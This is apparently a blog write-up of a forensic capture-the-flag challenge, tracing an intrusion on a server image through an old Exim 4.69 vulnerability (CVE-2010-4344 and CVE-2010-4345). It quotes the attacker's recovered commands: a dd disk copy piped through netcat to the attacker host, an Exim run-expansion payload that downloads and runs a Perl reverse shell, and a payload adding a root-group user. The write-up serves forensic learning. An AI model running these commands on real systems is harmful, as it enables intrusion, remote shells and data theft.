---
layout: post
title:  "The vulnerability that opened the door"
author: erik
categories: [ CTF ]
image: https://user-images.githubusercontent.com/47476901/151602088-45f0ad15-b610-45f7-b935-c8e1664fe8d3.png
beforetoc: ""
toc: false
tags: [ CTF, Intrusion, CVE, BufferOverflow, SMTP ]
---
CTF challenge about a system intrusion

#### Description:

  An acquaintance has provided us with a disk image of a server that he considers to be
            "is doing strange things".
  From the INCIBE laboratory, we have seen that there was
            "something strange" with some program.
  We need a second opinion from an expert. 

#### Can you help us identify the vulnerable application?
- File: DiscoS.zip
- Password: Gr33n2015## 

---

# Table of Contents
1. [Extracting the zip](#extractingthezip)
2. [Mount the image](#mountimg)
3. [Analyze command history](#analyzecommands)
4. [Analyzing malicious application](#maliciousapp)
5. [Corrupted logs](#corruptedlogs)


---
<a name="extractingthezip"></a>
### 1- Extracting the zip
Download DiscoS.zip and extract it using the provided password

```bash
unzip discoS.zip
```
![unzip](https://user-images.githubusercontent.com/47476901/151601581-c8a5e5b8-d5ca-48f0-bed3-784c8587ee69.png)

<a name="mountimg"></a>
### 2- Mount the image
It extracts an image, we will mount this image in a folder to see what it contains.

```bash
mkdir disco
sudo mount discoS.img disco
```
![mount](https://user-images.githubusercontent.com/47476901/151601607-9c2dfb92-f96d-4793-b7d6-42c71a9af47a.png)

<a name="analyzecommands"></a>
### 3- Analyze command history
Previously we were told that this system image has something strange, it may be something malicious, for this we will check if they accessed the root user and if so we can see what commands they executed as administrator user.

```bash
cat root/.bash_history
```
![bash_history](https://user-images.githubusercontent.com/47476901/151601626-071bcd58-4727-430e-b672-ae151a8816f6.png)

### What did the attacker do as an administrator?
<br>
**1- Removes the exim program from the system**

```bash
apt-get remove exim4
apt-get remove exim4-base
apt-get remove exim4-daemon-light
dpkg -l | grep exim
apt-get remove exim4-config
dpkg --purge
apt-get remove exim
dpkg -l | grep exim
```

**2- Check in which path it is located, create a folder called exim4 and open it.**

```bash
pwd
mkdir exim4
cd exim4/
```

**3- With the command scp copy all files via ssh from the attacker's host to the new folder**

```bash
scp yom@192.168.56.1:/home/yom/temporary/exim4/* .
```

**4- Install the vulnerable exim packages that were downloaded from your machine remotely.**

<li>This version of Exim has a critical vulnerability.</li>
<li>Exim 4.69 Remote code execution via buffer overflow (Memory overflow)</li>

```bash
dpkg -i exim4_4.69-9_all.deb 
dpkg -i --ignore-depends=exim4-base,exim4-daemon-light exim4_4.69-9_all.deb 
dpkg -i exim4-base_4.69-9_i386.deb 
dpkg -i exim4-config_4.69-9_all.deb 
dpkg -i exim4-base_4.69-9_i386.deb 
dpkg -i exim4-daemon-light_4.69-9_i386.deb 
```

**5- Once all vulnerable packages are installed, exit the folder and delete it.**

```bash
cd ..
rm -rf exim4/
```

**6- Stops all CPU operations with the halt command.**

<li>It is used to instruct the hardware to stop all CPU functions.</li>

<li>That is, it restarts or stops the system.</li>


**7- Install the OpenSSH program to encrypt connections over the network (alternative to SSH).**
```bash
apt-get install openssh-server
apt-get install openssh-server
```

**8- Configure the vulnerable mail server and reboot the system.**

```bash
cd /etc/exim4/
ls
vi update-exim4.conf.conf 
update-exim4.conf
halt
reboot
```

**9- Find the paths to the gcc, memdump binaries.**
<li>He don't have the memdump binary installed, he installed it.</li>
<li>memdump does a memory dump</li>
<li>gcc is a compiler</li>

```bash
whereis gcc
whereis memdump
apt-get install memdump
halt
```

**10- Check if he have a connection to your machine within the network.**

```bash
ifconfig 
ping 192.168.56.1
```

**11- Stealing data**
<li>The dd command is a very powerful tool, it cleans, verifies, destroys, duplicates data.</li>
<li>Copied the partition over a connection using netcat</li>
<li>What it did was that all the contents of the partition were sent over that connection.</li>
<li>The attacker located at 192.168.56.1 listened on that port from your machine and redirected all that output to your machine, thus making a copy of partitions across the network.</li>

```bash
mount
sudo dd if=/dev/sda | nc 192.168.56.1 4444
dd if=/dev/sda | nc 192.168.56.1 4444
dd if=/dev/sda1 | nc 192.168.56.1 4444
```

**12- Retrieving transferred data**
<li>The attacker installs 2 forensic tools to recover data from these partitions that may have become corrupted.</li>

```bash
apt-get install ddrescue
apt-get install dcfldd
```
<br>
<a name="maliciousapp"></a>
### 4- Analyzing malicious application

We have already seen that the malicious application is exim, a mail transfer service.

Exim version 4.69 contains a critical vulnerability.

Discovered in 2011, it was one of the main causes of botnets at the time.

By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim user (CVE-2010-4344) causing buffer overflow.

<li>An additional vulnerability, (CVE-2010-4345), was also used, this was the attack that led to the discovery that there was an intruder on the system.</li>

<li>This bug allows a local user to obtain root privileges from the Exim account (account running the mail service). </li>

<li>If the Perl interpreter is on the remote system the exploit will be performed, this module will also automatically exploit the secondary error to obtain the root.</li>

That is why this system failure was so serious, bringing together an RCE and an LPE and causing such a disaster. 
<br><br>
<b> - RCE: CVE-2010-4344</b><br>
<b> - LPE: CVE-2010-4345</b> 

Exploits and more info: <a href="https://eromang.zataz.com/2010/12/20/exim-4-69-remote-code-execution/" target="_blank">EXIM 4.69 RCE</a>

I leave a video of how to exploit this security flaw, using a metasploit module:
<a href="https://www.youtube.com/watch?v=DnSgOGIxjaQ" target="_blank">https://www.youtube.com/watch?v=DnSgOGIxjaQ</a>
<br>
<a name="corruptedlogs"></a>
### 5- Corrupted Logs
Once we know how all this happened we look at the logs, which was the main source of exploitation.

```bash
ls var/log/exim4
```

![logs](https://user-images.githubusercontent.com/47476901/151601664-c6e7360c-2345-47f4-b930-6209ed152a45.png)


Buffer Overflow log:

```bash
cat var/log/exim4/rejectlog
```

![BufferOverflow](https://user-images.githubusercontent.com/47476901/151601700-7197f48d-cdb2-4418-9454-f7170a103ef7.png)

He tried to download the file by performing the overflow and one of the requests was successful, once the perl file was downloaded from his attacker's machine, he placed it in tmp as user exim and executed it as that user.

```bash
cat var/log/exim4/mainlog
```

This perl binary performs a socket connection creating a remote session from the victim computer to the attacker.

```bash
${run{/bin/sh -c "exec /bin/sh -c 'wget http://192.168.56.1/c.pl -O /tmp/c.pl;perl /tmp/c.pl 192.168.56.1 4444; sleep 1000000'"}}
```
![perlreverse](https://user-images.githubusercontent.com/47476901/151601733-346e564f-5970-4da6-aeb8-1daae6426961.png)


Perl exploit that performs a reverse shell to the computer (exploit that runs in exim to connect to the computer remotely as root user):

<li>This is the Remote Code Execution</li>
<b>The way in which the attacker was connected</b>

![binarioperl](https://user-images.githubusercontent.com/47476901/151601751-a0c87d38-57af-4380-8b27-d8626a8fbc3c.png)

```bash
cat var/log/exim4/mainlog
```
      
Create a new user that is in the admin group with an md5 hashed password.

<li>This is the Local Privilege Escalation<br></li>
**How to become root**

```bash
${run{/bin/sh -c "exec /bin/sh -c 'useradd --gid root --create-home --password  0 0mkpasswd -H md5 Ulyss3s) ulysses'"}} 
```

![createusuario](https://user-images.githubusercontent.com/47476901/151601768-cab31bd9-4515-4174-bcf1-7ec1df3979df.png)


In tmp we can see how the file is <b>c.perl</b> (which generated that connection),
and a compressed file named  <b>rk.tar</b>

![tmpfiles](https://user-images.githubusercontent.com/47476901/151601785-d6662d80-4c74-4a1a-9d95-ded5142f1266.png)


Analyzing the rk file, we realize that it is a rootkit, which generates a backdoor to the system using iptables and so on.

![rootkit](https://user-images.githubusercontent.com/47476901/151602060-d4c88931-3218-4611-8a43-ff6eddf33892.png)
